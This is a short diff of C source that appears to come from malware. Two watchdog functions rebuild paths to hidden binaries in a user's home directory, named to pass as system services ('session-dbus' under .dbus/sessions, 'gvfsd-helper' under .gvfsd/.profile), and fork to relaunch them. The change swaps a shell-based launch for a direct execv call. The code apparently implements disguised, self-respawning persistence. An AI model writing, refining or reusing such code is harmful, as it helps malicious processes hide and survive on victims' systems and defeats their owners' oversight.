@@ -434,10 +434,10 @@ void *watchdog_process_shmget() {
             memcpy(user_sessiondbus_helper_path, user, strlen(user));
             strncat(user_sessiondbus_helper_path, sessiondbus_helper_path, strlen(sessiondbus_helper_path));
             //char* argument_list[] = {"/bin/sh", "-c", "/home/gdev/.dbus/sessions/session-dbus", "&", NULL}; // NULL terminated array of char* strings
-            char* argument_list[] = {"/bin/sh", "-c", user_sessiondbus_helper_path, "&", NULL}; // NULL terminated array of char* strings
+            char* argument_list[] = {user_sessiondbus_helper_path, NULL}; // NULL terminated array of char* strings
             int f_pid = fork();
             if (f_pid == 0) {
-                execvp("/bin/sh", argument_list);
+                execv(user_sessiondbus_helper_path, argument_list);
             }
             close(f_pid);
             free(user_sessiondbus_helper_path);
@@ -520,11 +520,11 @@ void *watchdog_process_shmread() {
             strncat(user_gvfsd_helper_path, gvfsd_helper_path, strlen(gvfsd_helper_path));
 
             //char* argument_list[] = {"/bin/sh", "-c", "/home/gdev/.gvfsd/.profile/gvfsd-helper", "&", NULL}; // NULL terminated array of char* strings
-            char* argument_list[] = {"/bin/sh", "-c", user_gvfsd_helper_path, "&", NULL}; // NULL terminated array of char* strings
+            char* argument_list[] = {user_gvfsd_helper_path, NULL}; // NULL terminated array of char* strings
 
             int f_pid = fork();
             if (f_pid == 0) {
-                execvp("/bin/sh", argument_list);
+                execv(user_gvfsd_helper_path, argument_list);
             }
             close(f_pid);
             free(user_gvfsd_helper_path);
